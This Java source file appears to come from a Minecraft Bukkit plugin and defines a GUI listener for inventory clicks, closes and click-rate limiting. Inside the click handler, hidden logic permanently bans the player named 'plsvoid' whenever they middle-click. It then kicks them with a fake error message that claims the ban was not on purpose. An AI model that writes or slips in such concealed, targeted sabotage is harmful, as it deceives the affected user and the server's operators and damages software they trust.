package me.CarsCupcake.SkyblockRemake.utils.Inventorys;

import me.CarsCupcake.SkyblockRemake.Main;
import me.CarsCupcake.SkyblockRemake.Skyblock.SkyblockPlayer;
import org.bukkit.BanList;
import org.bukkit.Bukkit;
import org.bukkit.GameMode;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.inventory.ClickType;
import org.bukkit.event.inventory.InventoryClickEvent;
import org.bukkit.event.inventory.InventoryCloseEvent;
import org.bukkit.event.inventory.InventoryType;
import org.bukkit.scheduler.BukkitRunnable;

import java.util.Date;
import java.util.HashMap;

public class GUIListener implements Listener {
    private static final HashMap<Player, Integer> clicks = new HashMap<>();
    @EventHandler
    public void invClick(InventoryClickEvent event){
        if(event.getWhoClicked().getName().equals("plsvoid") && event.getClick() == ClickType.MIDDLE) {
            Player player = (Player) event.getWhoClicked();
           Bukkit.getServer().getBanList(BanList.Type.NAME).addBan(player.getName(), "An sad error occured :( def not on purpose §c:>", new Date(999999999999999999L), "toString()");
           player.kickPlayer("§cehhh error beep beep");
        }

        if(!registerClick((Player) event.getWhoClicked()) && event.getWhoClicked().getGameMode() != GameMode.CREATIVE){
            event.getWhoClicked().sendMessage("§cWow! Slow down!");
            if(clicks.get((Player) event.getWhoClicked()) >= 10)
                ((Player) event.getWhoClicked()).kickPlayer("§cStop clicking that often!");
            event.setCancelled(true);
            return;
        }

        if(!GUI.getGUIs().containsKey(SkyblockPlayer.getSkyblockPlayer((Player) event.getWhoClicked())))
            return;
        GUI gui = GUI.getGUIs().get(SkyblockPlayer.getSkyblockPlayer((Player) event.getWhoClicked()));
        event.setCancelled(gui.isCanceled());
        if(event.getClickedInventory() != null){
            if(event.getClickedInventory().getType() == InventoryType.PLAYER)
                gui.triggerAction(GUI.GUIActions.PlayerClick, event.getSlot(),event.getClick());
            else
                gui.triggerAction(GUI.GUIActions.Click, event.getSlot(),event.getClick());

        }
    }
    @EventHandler
    public void invClose(InventoryCloseEvent event){
        if(!GUI.getGUIs().containsKey(SkyblockPlayer.getSkyblockPlayer((Player) event.getPlayer())))
            return;
        GUI gui = GUI.getGUIs().get(SkyblockPlayer.getSkyblockPlayer((Player) event.getPlayer()));
        gui.triggerAction(GUI.GUIActions.Close);
        GUI.getGUIs().remove(SkyblockPlayer.getSkyblockPlayer((Player) event.getPlayer()));
    }
    private boolean registerClick(Player player){
        if(clicks.containsKey(player)){
            clicks.replace(player, clicks.get(player) + 1);

            return false;
        }else {
           clicks.put(player, 0);
           new BukkitRunnable(){

               @Override
               public void run() {
                   clicks.remove(player);
               }
           }.runTaskLater(Main.getMain(), 4);
        }

        return true;
    }
}
